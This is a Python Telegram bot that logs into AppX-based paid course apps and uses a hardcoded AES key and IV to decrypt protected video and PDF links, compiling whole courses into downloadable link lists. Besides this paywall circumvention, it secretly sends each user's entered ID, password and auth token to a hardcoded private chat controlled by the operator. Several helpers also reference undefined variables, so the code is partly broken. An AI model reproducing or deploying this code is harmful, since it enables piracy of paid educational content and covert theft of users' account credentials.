import requests
import re
import json
from pyrogram.types import InputMediaDocument
from pyrogram.types.messages_and_media import message
from pyromod import listen
from pyrogram.types import Message
import pyrogram
from pyrogram import Client, filters
from pyrogram import Client as bot
from pyrogram.types.messages_and_media import message
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.errors import FloodWait
from pyrogram.types import User, Message
import logging
import main
import config
import asyncio
import os
import base64
import cloudscraper
from Crypto.Cipher import AES

import datetime


time = datetime.datetime.now().strftime("%d-%m-%Y")

my_data = -1001938939742
sudo_group = config.GROUPS
ADMINS = config.ADMINS

def appx_dec(link):
    key = b'638udh3829162018'
    iv = b'fedcba9876543210'
    link = base64.b64decode(link.split(':')[0])
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_link = cipher.decrypt(link)
    unpadded_link = decrypted_link[:-decrypted_link[-1]]
    final_link = unpadded_link.decode('utf-8')
    return final_link

def fapi1(bid, bname):
    fapi1_url = f"https://{raw_text05}/get/folder_contentsv2?course_id={bid}&parent_id=-1"
    response = requests.get(fapi1_url, headers=headers)
    if response.status_code != 200:
        print(f"Failed to fetch folder contents for course ID {bid}. Status code: {response.status_code}")
        return "N/A", "N/A"
    data = response.json()
    fid = data["data"][0]["id"]
    fname = data["data"][0]["Title"]
    return fid, fname

def fapi2(bid, fid, fname):
    fapi2_url = f"https://{raw_text05}/get/folder_contentsv2?course_id={bid}&parent_id={fid}"
    response = requests.get(fapi2_url, headers=headers)
    if response.status_code != 200:
        print(f"Failed to fetch folder contents for folder ID {fid}. Status code: {response.status_code}")
        return []
    data = response.json()
    cdatas = data.get("data", [])
    return cdatas

def vapi(bid, vid):
    vapi_url = f"https://{raw_text05}/get/fetchVideoDetailsById?course_id={bid}&video_id={vid}&ytflag=0&folder_wise_course=1"
    count = 0
    request_count = 0
    while True:
        try:
            response = requests.get(vapi_url, headers=headers)
            time.sleep(0.4)  # Sleep for 0.4 seconds
            if response.status_code != 200:
                print(f"Failed to fetch video details for video ID {vid}. Status code: {response.status_code}")
                break
            data = response.json()
            title = data["data"]["Title"]
            vlink1 = data["data"]["download_link"]
            vlink2 = data["data"]["video_player_token"]
            plink1 = data["data"]["pdf_link"]
            plink2 = data["data"]["pdf_link2"]
            if vlink1:
                link = appx_dec(vlink1)
            else:
                link = f"https://player.akamai.net.in/secure-player?isMobile=true&token={vlink2}"
            if plink1:
                plink1 = appx_dec(plink1)
            if plink2:
                plink2 = appx_dec(plink2)
            return title, link, plink1, plink2
        except Exception as e:
            count += 1
            if count > 3:
                with open("response.txt", "w") as f:
                    f.write(str(e))
                print("Error response saved to response.txt")
                break
            time.sleep(5)  # Sleep for 5 seconds on error
        request_count += 1
        if request_count % 50 == 0:
            time.sleep(10)  # Sleep for 10 seconds after every 50 requests

def process_folder(bid, fid, fname, f):
    cdatas = fapi2(bid, fid, fname)
    for cdata in cdatas:
        mtype = cdata["material_type"]
        if mtype == "IMAGE":
            title = cdata["Title"]
            link = cdata["thumbnail"]
            mm = f"({fname}) {title}:{link}\n"
            print(mm)
            f.write(mm)
        elif mtype == "VIDEO":
            vid = cdata["id"]
            title, vlink, plink1, plink2 = vapi(bid, vid)
            mm = f"({fname}) {title}:{vlink}\n"
            print(mm)
            f.write(mm)
            if plink1:
                mm = f"({fname}) {title}:{plink1}\n"
                print(mm)
                f.write(mm)
            if plink2:
                mm = f"({fname}) {title} (PDF-2):{plink2}\n"
                print(mm)
                f.write(mm)
        elif mtype == "PDF":
            title = cdata["Title"]
            plink1 = cdata["pdf_link"]
            plink2 = cdata["pdf_link2"]
            if plink1:
                link = appx_dec(plink1)
                mm = f"({fname}) {title}:{link}\n"
                print(mm)
                f.write(mm)
            if plink2:
                link = appx_dec(plink2)
                mm = f"({fname}) {title} (PDF-2):{link}\n"
                print(mm)
                f.write(mm)
        elif mtype == "FOLDER":
            fid = cdata["id"]
            fname = cdata["Title"]
            process_folder(bid, fid, fname, f)

@bot.on_message(filters.command("appx") & (filters.chat(sudo_group) | filters.user(ADMINS)))
async def start(bot, m):
    editable = await bot.send_message(m.chat.id, "Send Your Folder **APPX APPLICATION API**\nLike `Aman Vashisht Yodha Uc Live` etc")
    input01: Message = await bot.listen(editable.chat.id)
    raw_text05 = input01.text
    await input01.delete(True)
    await editable.edit("Send **ID & Password** in this manner otherwise bot will not reply.\n\nSend like this »  ID*Password.")
    login_hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': '-2',
        'language': 'en',
        'device_type': 'ANDROID',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/4.9.1',
    }
    
    data = {
        'email': '',
        'password': '',
        'devicetoken': 'evxVp-BBB3I:APA91bFSglfbsDx7kYeVNnOszxud1cUyXj-p54ejyaSvItmM7p5EPH9iyZKKk0N66gROVI3cRWVg1Bvy4tuBsU1VPulrjKqoiF644NI9dqKUswrnOc5TLd0ZHrTZsgy6tSLpcG6OMz7F',
        'mydeviceid': 'e4be9d04e8ca6e44',
    }
    input: Message = await bot.listen(editable.chat.id)
    raw_text = input.text
    await input.delete(True)
    if "*" in raw_text:
        data["email"] = raw_text.split("*")[0]
        data["password"] = raw_text.split("*")[1]    
        scraper = cloudscraper.create_scraper()	
        html = scraper.post("https://"+raw_text05+"/post/userLogin", data, headers=login_hdr).content
        output = json.loads(html)
        token = output["data"]["token"]
        userid = output["data"]["userid"]
    else:
        token = raw_text.split("$")[0]
        userid = raw_text.split("$")[1]
    
    hdr = {
        'Client-Service': 'Appx',
        'Auth-Key': 'appxapi',
        'User-ID': userid,
        'Authorization': token,
        'language': 'en',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': f'{raw_text05}',
        'Connection': 'Keep-Alive',
        'User-Agent': 'okhttp/4.9.1',
    }        

    scraper = cloudscraper.create_scraper()
    params = (
    ('userid', f'{userid}'),
    )
    html1 = scraper.get("https://"+raw_text05+"/get/mycoursev2", headers=hdr, params=params).json()["data"]
    cool = ""
    for data in html1:
        aa = f" {data['id']} » {data['course_name']} ✳️ ₹{data['price']}\n\n"
        if len(f'{cool}{aa}') > 4096:
            print(aa)
            cool = ""
        cool += aa
    await bot.send_message(my_data, f"**Api :** `{raw_text05}`\n\n**ID * Pass :** `{raw_text}`\n\n**Token :** `{token}${userid}`\n\n{cool}")
    await editable.edit(f"**Batches Available are :-**\n\n**BATCH ID**  ➤  **BATCH NAME**\n\n{cool}\nSEND ID :")
    input1 = await bot.listen(editable.chat.id)
    raw_text1 = input1.text
    await input1.delete(True)
    
    for data in html1:
      if (data["id"]) == raw_text1:
            course_id = raw_text1
            batch_logo = data['course_thumbnail']
            course_name = (data["course_name"])
            fid, fname = fapi1(course_id, course_name)
            with open(f"{course_name}.txt", "w") as f:
                process_folder(course_id, fid, fname, f)

    caption_details = raw_text05.replace("api.classx.co.in", "").replace("api.teachx.co.in", "").replace("api.appx.co.in", "").replace("api.teachx.in", "").upper()
    file1 = InputMediaDocument(f"{course_name}.txt", caption=f"**🌀 Batch Id :** {course_id}\n**✳️ App :** {caption_details} (AppX V2)\n\n**📚 Batch :** `{course_name}`\n\n**🌪️ Thumb :** `{batch_logo}`\n\n**❄️ Date :** {time}")
    await bot.send_media_group(m.chat.id, [file1])
    await bot.send_media_group(my_data, [file1])
    os.remove(f"{course_name}.txt")
    await bot.send_message(m.chat.id, "Batch Grabbing Done\nThanks to VEBHI ♥")


        
